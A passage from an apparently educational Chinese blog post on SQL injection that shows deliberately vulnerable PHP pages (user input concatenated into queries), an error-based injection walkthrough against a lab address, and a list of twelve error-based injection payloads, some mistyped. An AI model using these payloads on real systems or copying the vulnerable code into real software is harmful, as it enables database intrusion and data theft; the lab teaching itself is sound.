+<h4 id="Boolean注入代码分析"><a href="#Boolean注入代码分析" class="headerlink" title="Boolean注入代码分析"></a>Boolean注入代码分析</h4><p>​    在Boolean注入页面中程序先获取GET参数ID,通过preg_match判断其中是否存在union/sleep/benchmark等危险字符。然后将参数ID拼接到SQL语句,从数据库查询，如果有结果，则返回yes，否则返回no。当访问该页面时，代码根据数据库查询的结果返回yes或no,而不返回数据库中的任何数据，所以页面上只会显示yes或no,代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/union|sleep|benchmark/i"</span>, $id)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con,<span class="string">"select * from users where `user_id`='"</span>.$id.<span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($row) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"yes"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>注入测试网址：192.168.23.134/error/error.php?username=1</p>
+<p>加上单引号后会报错。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190228170524864.jpg" alt="在这里插入图片描述"></p>
+<p>通过页面返回结果可以看出，程序直接将错误信息输出到了页面上，所以利用报错注入获取数据。报错注入有多种方式，此处利用函数updataxml()SQL语句获取user()的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+<p>其中0x7e是ASCII编码，解码结果为~,concat函数用于连接字符串。</p>
+<p><img src="https://img-blog.csdnimg.cn/2019022817054374.jpg" alt="在这里插入图片描述"></p>
+<p>然后获取当前的数据库名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170606206.jpg" alt="在这里插入图片描述"></p>
+<p>接下来查询表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select table_name from information_schema.tables where table_schema=’dvwa’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190228170625945.jpg" alt="在这里插入图片描述"></p>
+<h4 id="报错注入代码分析"><a href="#报错注入代码分析" class="headerlink" title="报错注入代码分析"></a>报错注入代码分析</h4><p>  在报错注入页面中，程序获取GET参数username后，将username拼接到SQL语句中，然后到数据库查询，如果执行成功，就输出ok;如果出错，则通过mysqli_error($con)将错误信息输出到页面。代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result = mysqli_query($con,<span class="string">"select * from users where `first_name`='"</span>.$username.<span class="string">"'"</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> mysqli_error($con);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  输入username=1’时，SQL语句为select * from users where ‘username’=’1’’会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor(),updatexml()等函数将要查询的内容输出到页面上。</p>
+<p><strong>sql报错注入的12个函数</strong></p>
+<p>1、通过floor报错,注入语句如下:   </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> select <span class="number">1</span> from (select count(*),concat(version(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+<p>2、通过ExtractValue报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (select table_name from information_schema.tables limit <span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+<p>3、通过UpdateXml报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(selectuser())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<p>4、通过NAME_CONST报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> exists(select*from(select*from(selectname_const(@@version,<span class="number">0</span>))a join (select name_const(@@version,<span class="number">0</span>))b)c)</span><br></pre></td></tr></table></figure>
+<p>5、通过join报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure>
+<p>6、通过exp报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure>
+<p>7、通过GeometryCollection()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure>
+<p>8、通过polygon ()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure>
+<p>9、通过multipoint ()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
+<p>10、通过multlinestring ()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+<p>11、通过multpolygon ()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+<p>12、通过linestring ()报错,注入语句如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>本次分享是Union注入，报错注入，布尔注入的原理分析，及其代码审计！下次分享的是另外几种注入的代码审计及其原理分享，如：时间注入，堆叠注入，二次注入，cookie注入等！如有兴趣，请移步-&gt;<br>传送门：<br><a href="https://blog.csdn.net/JBlock/article/details/88040022" target="_blank" rel="noopener">SQL注入回顾篇(二)</a><br><a href="https://blog.csdn.net/JBlock/article/details/88044293" target="_blank" rel="noopener">SQL注入回顾篇(三)</a><br><a href="https://blog.csdn.net/JBlock/article/details/88048895" target="_blank" rel="noopener">SQL注入回顾篇(四)</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://ethancck.github.io">Ethan</a>
+            </p><p>原文链接：<a href="https://ethancck.github.io/2019/03/01/SQL注入回顾篇(一)/">https://ethancck.github.io/2019/03/01/SQL注入回顾篇(一)/</a>
+            </p><p>发表日期：<a href="https://ethancck.github.io/2019/03/01/SQL注入回顾篇(一)/">March 1st 2019, 10:12:21 am</a>
+            </p><p>更新日期：<a href="https://ethancck.github.io/2019/03/01/SQL注入回顾篇(一)/">March 22nd 2019, 7:01:54 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/03/01/SQL注入回顾篇(三)/" title="SQL注入回顾篇(3)">
+                    <div class="nextTitle">SQL注入回顾篇(3)</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/03/01/SQL注入回顾篇(二)/" title="SQL注入回顾篇(2)">
+                    <div class="prevTitle">SQL注入回顾篇(2)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql注入相关知识点"><span class="toc-number">3.</span> <span class="toc-text">Mysql注入相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分类"><span class="toc-number">4.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Union注入"><span class="toc-number">5.</span> <span class="toc-text">Union注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Union注入代码分析"><span class="toc-number">6.</span> <span class="toc-text">Union注入代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean注入"><span class="toc-number">7.</span> <span class="toc-text">Boolean注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean注入代码分析"><span class="toc-number">8.</span> <span class="toc-text">Boolean注入代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入"><span class="toc-number">9.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入代码分析"><span class="toc-number">10.</span> <span class="toc-text">报错注入代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结语"><span class="toc-number">11.</span> <span class="toc-text">结语</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 26
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/Xposed 插件开发基础/">Xposed插件开发</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/iscc线下攻防复现/">iscc2018攻防</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href="/2019/05/13/RFI绕过URL包含限制getshell/">RFI绕过URL包含限制getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/phar反序列化拓展攻击浅析/">phar反序列化拓展攻击浅析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/xss启示录/">xss启示录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/curl的一些tircks/">curl的一些tircks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/反序列化的一些tricks/">反序列化的一些tricks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/PHP之反序列化分析/">PHP之反序列化分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/AWD线下准备指南/">AWD线下备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href="/2019/03/30/FUZZ测试某狗WAF绕过/">FUZZ测试某狗WAF绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href="/2019/03/29/WFUZZ使用教程/">WFUZZ使用教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/大话FUZZ测试/">大话FUZZ测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(上)/">php代码审计之函数漏洞审计(上)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(下)/">php代码审计之函数漏洞审计(下)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href="/2019/03/07/CTF命令执行及绕过技巧/">CTF命令执行及绕过技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/Phpstorm+Xdebug动态调试配置/">Phpstorm+Xdebug动态调试配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href="/2018/10/04/python沙盒逃逸/">python 沙盒逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2018/09/02/萌萌哒报名系统/">CTF&&lctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href="/2018/08/29/安卓架构分析/">安卓架构分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href="/2018/08/28/时光/">时光说</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向破解"><span class="iconfont-archer">&#xe606;</span>逆向破解</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="安卓架构"><span class="iconfont-archer">&#xe606;</span>安卓架构</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="年轻时"><span class="iconfont-archer">&#xe60a;</span>年轻时</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="系统安全"><span class="iconfont-archer">&#xe60a;</span>系统安全</span>
+    
+        <span class="sidebar-category-name" data-categories="移动安全"><span class="iconfont-archer">&#xe60a;</span>移动安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Ethan"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
